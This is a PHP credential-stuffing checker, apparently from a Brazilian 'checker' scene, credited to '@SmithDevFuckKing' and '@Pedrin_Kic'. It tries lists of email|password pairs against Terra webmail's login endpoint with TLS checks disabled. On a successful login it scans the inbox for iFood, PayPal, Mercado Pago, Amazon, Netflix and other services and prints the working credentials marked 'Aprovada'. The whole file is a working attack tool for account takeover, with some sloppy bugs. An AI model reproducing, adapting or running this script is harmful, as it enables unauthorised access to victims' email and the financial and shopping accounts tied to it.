<?php
///by:@SmithDevFuckKing
extract($_GET);
error_reporting(0);

function getStr($string,$start,$end){
$str = explode($start,$string);
$str = explode($end,$str[1]);
return $str[0];}
{
$separador = "|";
$e = explode("\r\n", $lista);
$c = count($e);
for ($i=0; $i < $c; $i++) { 
$explode = explode($separador, $e[$i]);
Testar(trim($explode[0]),trim($explode[1]));}
}

function Testar($email,$senha){
if (file_exists(getcwd()."/cookies.txt")) {
unlink(getcwd()."/cookies.txt");}


$time = time();



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://mail.terra.com.br/mobile/index.php?r=site/wslogin&logincapa=1&timestamp=1683910312695');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(

'Accept: application/json, text/javascript, */*; q=0.01',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'X-Requested-With: XMLHttpRequest',
'sec-ch-ua-mobile: ?1',
'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36',
'Referer: https://mail.terra.com.br/mobile/index.php?r=site/login',
));
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_USERAGENT, $_Server['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'LoginForm%5Busername%5D='.$email.'&LoginForm%5Bpassword%5D='.$senha.'&YII_CSRF_TOKEN=e8f0727253326ca32605b030947423cc1927699e');
$data1 = curl_exec($ch);


$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://mail.terra.com.br/mobile/index.php?r=message/wslist&page=1&MailBox%5Bmailbox_id%5D=INBOX');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(

'Accept: application/json, text/javascript, */*; q=0.01',
'X-Requested-With: XMLHttpRequest',
'sec-ch-ua-mobile: ?1',
'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36',
'Referer: https://mail.terra.com.br/mobile/index.php',
));
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_USERAGENT, $_Server['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$data2 = curl_exec($ch);


if (strpos($data2, 'Ifood')) {
$ifood = "✅";} 
else {
$ifood = "❌";}

if (strpos($data2, 'Facebook')) {
$uber = "✅";} 
else {
$uber = "❌";}

if (strpos($data2, 'Mercado Livre')) {
$ml = "✅";} 
else {
$ml = "❌";}

if (strpos($data2, 'Mercado Pago')) {
$mp = "✅";} 
else {
$mp = "❌";}

if (strpos($data2, 'Americanas')) {
$americanas = "✅";} 
else {
$americanas = "❌";}

if (strpos($data2, 'Amazon')) {
$amazon = "✅";} 
else {
$amazon = "❌";}

if (strpos($data2, 'PagSeguro')) {
$pags = "✅";} 
else {
$pags = "❌";}

if (strpos($data2, 'Paypal')) {
$pp = "✅";} 
else {
$pp = "❌";}

if (strpos($data2, 'Prime')) {
$prime = "✅";} 
else {
$prime = "❌";}

if (strpos($data2, 'Netflix')) {
$netflix = "✅";} 
else {
$netflix = "❌";}

if (strpos($data2, 'Globoplay')) {
$globoplay = "✅";} 
else {
$globoplay = "❌";}

if (strpos($data2, 'Premiere')) {
$premiere = "✅";} 
else {
$premiere = "❌";}

if (strpos($data2, 'Rappi')) {
$crunch = "✅";} 
else {
$crunch = "❌";}

if (strpos($data2, 'Shein')) {
$Shein = "✅";} 
else {
$shein = "❌";}



//_______//


if (strpos($data1, '"\/ozone\/","valid":true')){
exit('<b><span class="badge badge-success">Aprovada</span> ➜ '.$email.'|'.$senha.'<br><font style=color:#ff33cc>$RETORNOS ENCONTRADOS$</font><br><br><font style=color:lime>↓ COMIDAS ↓<br>IFOOD : '.$ifood.'<br>FACEBOOK : '.$uber.'<br><br>↓ BANK ETC ↓<br>MP : '.$mp.'<br>PAGS : '.$pags.'<br>PP : '.$pp.'<br><br>↓RETORNOS LOJAS ↓<br>ML : '.$ml.'<br>AMERICANAS : '.$americanas.'<br>AMAZON : '.$amazon.'<br><br>↓ CONTAS ↓<br>NETFLIX : '.$netflix.'<br>PRIME : '.$prime.'<br>GLOBOPLAY : '.$globoplay.'<br>PREMIERE : '.$premiere.'<br>RAPPI :'.$rappi.
'<br>Shein : '.$Shein.'</font> <br><br>By @Pedrin_Kic Tempo : ' . (time() - $time) .  ' Seg</b><br>');}




//_______//





else if (strpos($data1, '"\/mobile\/index.php","valid":true')){
exit('<b><span class="badge badge-success">Aprovada</span> ➜ '.$email.'|'.$senha.'<br><font style=color:#ff33cc>$Contas Encontradas🇧🇷$</font><br><br><font style=color:lime>↓ COMIDAS ↓<br>IFOOD : '.$ifood.'<br>FACEBOOK : '.$uber.'<br><br>↓ BANK ETC ↓<br>MP : '.$mp.'<br>PAGS : '.$pags.'<br>PP : '.$pp.'<br><br>↓ LOJAS ↓<br>ML : '.$ml.'<br>AMERICANAS : '.$americanas.'<br>AMAZON : '.$amazon.'<br><br>↓ CONTAS ↓<br>NETFLIX : '.$netflix.'<br>PRIME : '.$prime.'<br>GLOBOPLAY : '.$globoplay.'<br>PREMIERE : '.$premiere.'<br>RAPPI : '.$rappi.
'<br>Shein : '.$Shein.'</font> <br><br>By @Pedrin_Kic Temp: ' . (time() - $time) .  ' Seg</b><br>');}





elseif(strpos($data1, '"LoginForm_password":["')){
exit('<b><span class="badge badge-danger">Reprovada</span> ➜ '.$email.'|'.$senha.' ➜ <span class="badge badge-white">'.$erro.'</span></b><br>');}

else
 exit('<b><span class="badge badge-danger">Reprovada</span> ➜ '.$email.'|'.$senha.' ➜ Email ou senha Incorreta<span class="badge badge-white">'.$erro.'</span></b><br>');}


?>